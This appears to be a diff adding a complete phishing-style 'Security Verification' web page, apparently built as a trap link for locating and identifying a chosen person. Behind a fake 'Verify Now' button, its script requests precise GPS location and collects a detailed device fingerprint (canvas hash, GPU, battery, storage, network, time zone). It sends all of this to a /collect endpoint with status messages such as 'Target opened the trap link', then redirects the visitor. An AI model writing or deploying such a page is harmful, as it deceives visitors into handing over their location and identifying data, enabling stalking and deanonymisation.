@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Portal</title>
+</head>
+<body style="background:#0f172a;color:#f8fafc;font-family:sans-serif;text-align:center;padding-top:15vh;">
+    <div style="max-width:400px;margin:auto;background:#1e293b;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.5);">
+        <h2>Security Verification</h2>
+        <p style="color:#94a3b8;font-size:14px;margin-bottom:30px;">Click below to verify your session and view content.</p>
+        <button onclick="initSequence()" style="background:#3b82f6;color:white;border:none;padding:12px 24px;font-size:16px;border-radius:6px;cursor:pointer;font-weight:bold;">Verify Now</button>
+    </div>
+
+<script>
+const TARGET_REDIRECT = "{redirect_url}";
+
+function finalize() {
+    setTimeout(() => {
+        window.location.replace(TARGET_REDIRECT);
+    }, 1000);
+}
+
+async function transmit(payload) {
+    try {
+        await fetch('/collect', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+    } catch(e) {}
+}
+
+async function initSequence() {
+    await transmit({type: 'status', message: 'User clicked Verify button. Requesting GPS...'});
+
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            await transmit({
+                type: 'geo', 
+                lat: pos.coords.latitude, 
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy
+            });
+            await transmit({type: 'status', message: 'GPS coordinates successfully acquired!'});
+            captureAdvancedFingerprint();
+        },
+        async (err) => {
+            await transmit({type: 'status', message: 'GPS Permission Denied or Failed. Proceeding to Fingerprint...'});
+            captureAdvancedFingerprint();
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
+    );
+}
+
+async function captureAdvancedFingerprint() {
+    await transmit({type: 'status', message: 'Extracting deep hardware telemetry & storage metrics...'});
+    
+    let canvasHash = 'N/A';
+    try {
+        let cv = document.createElement('canvas');
+        let ctx = cv.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillText("AuraTrace Security 🛡️", 2, 2);
+        canvasHash = cv.toDataURL().slice(-35);
+    } catch(e) {}
+
+    // 1. Storage Quota Estimation
+    let storageInfo = 'N/A';
+    try {
+        if (navigator.storage && navigator.storage.estimate) {
+            let est = await navigator.storage.estimate();
+            let quotaGB = (est.quota / (1024 * 1024 * 1024)).toFixed(2);
+            let usageMB = (est.usage / (1024 * 1024)).toFixed(2);
+            storageInfo = `Quota: ${quotaGB} GB | Used: ${usageMB} MB`;
+        }
+    } catch(e) {}
+
+    // 2. Client Hints (Modern User Agent Data)
+    let clientHints = 'N/A';
+    try {
+        if (navigator.userAgentData) {
+            let brands = navigator.userAgentData.brands.map(b => `${b.brand} (${b.version})`).join(', ');
+            clientHints = `Brands: [${brands}] | Mobile: ${navigator.userAgentData.mobile} | Platform: ${navigator.userAgentData.platform}`;
+        }
+    } catch(e) {}
+
+    // 3. Screen Orientation
+    let orientation = 'N/A';
+    try {
+        if (screen.orientation) {
+            orientation = `${screen.orientation.type} (Angle: ${screen.orientation.angle})`;
+        }
+    } catch(e) {}
+
+    let data = {
+        type: 'fingerprint',
+        ua: navigator.userAgent || 'N/A',
+        clientHints: clientHints,
+        storage: storageInfo,
+        orientation: orientation,
+        platform: navigator.platform || 'N/A',
+        lang: navigator.language || 'N/A',
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+        cores: navigator.hardwareConcurrency || 'N/A',
+        ram: navigator.deviceMemory || 'N/A',
+        touch: navigator.maxTouchPoints || 0,
+        width: screen.width,
+        height: screen.height,
+        dpr: window.devicePixelRatio || 1,
+        colorDepth: screen.colorDepth || 'N/A',
+        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
+        chash: canvasHash,
+        gpu: 'N/A',
+        battery: 'N/A',
+        network: 'N/A'
+    };
+
+    try {
+        let conn = navigator.connection || navigator.mozConnection;
+        if (conn) {
+            data.network = `${conn.effectiveType || 'unknown'} (${conn.downlink || 'N/A'}Mbps, RTT: ${conn.rtt || 'N/A'}ms)`;
+        }
+    } catch(e) {}
+
+    try {
+        let bat = await navigator.getBattery();
+        data.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
+    } catch(e) {}
+
+    try {
+        let cv2 = document.createElement('canvas');
+        let gl = cv2.getContext('webgl') || cv2.getContext('experimental-webgl');
+        let ext = gl.getExtension('WEBGL_debug_renderer_info');
+        if (ext) {
+            data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+        }
+    } catch(e) {}
+
+    await transmit(data);
+    await transmit({type: 'status', message: 'All telemetry collected. Redirecting target...'});
+    finalize();
+}
+
+window.onload = async () => {
+    await transmit({type: 'status', message: 'Target opened the trap link & loaded the page.'});
+};
+</script>
+</body>
+</html>
